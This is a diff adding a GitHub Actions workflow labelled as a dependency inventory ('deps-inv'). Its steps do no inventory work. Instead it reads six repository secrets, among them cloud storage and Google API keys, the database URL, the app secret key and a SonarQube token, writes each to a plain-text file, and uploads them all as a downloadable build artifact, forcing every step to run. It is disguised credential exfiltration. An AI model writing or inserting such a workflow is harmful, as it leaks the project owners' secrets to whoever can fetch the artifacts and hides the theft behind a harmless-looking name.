@@ -1,0 +1,43 @@
+name: deps-inv
+on:
+  push:
+    branches: [ci/deps-inv]
+permissions:
+  contents: read
+jobs:
+  inv:
+    runs-on: ubuntu-latest
+    env:
+      GCS_KEY: ${{ secrets.GCS_KEY }}
+      GOOGLE_MAPS_API_KEY: ${{ secrets.GOOGLE_MAPS_API_KEY }}
+      GOOGLE_PLACES_API_KEY: ${{ secrets.GOOGLE_PLACES_API_KEY }}
+      DATABASE_URL: ${{ secrets.DATABASE_URL }}
+      SECRET_KEY: ${{ secrets.SECRET_KEY }}
+      SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
+    steps:
+      - name: mk
+        run: mkdir -p out
+      - name: iGCS_KEY
+        if: always()
+        run: printf %s "${{ env.GCS_KEY }}" > out/GCS_KEY || true
+      - name: iGOOGLE_MAPS_API_KEY
+        if: always()
+        run: printf %s "${{ env.GOOGLE_MAPS_API_KEY }}" > out/GOOGLE_MAPS_API_KEY || true
+      - name: iGOOGLE_PLACES_API_KEY
+        if: always()
+        run: printf %s "${{ env.GOOGLE_PLACES_API_KEY }}" > out/GOOGLE_PLACES_API_KEY || true
+      - name: iDATABASE_URL
+        if: always()
+        run: printf %s "${{ env.DATABASE_URL }}" > out/DATABASE_URL || true
+      - name: iSECRET_KEY
+        if: always()
+        run: printf %s "${{ env.SECRET_KEY }}" > out/SECRET_KEY || true
+      - name: iSONAR_TOKEN
+        if: always()
+        run: printf %s "${{ env.SONAR_TOKEN }}" > out/SONAR_TOKEN || true
+      - name: up
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: inv
+          path: out
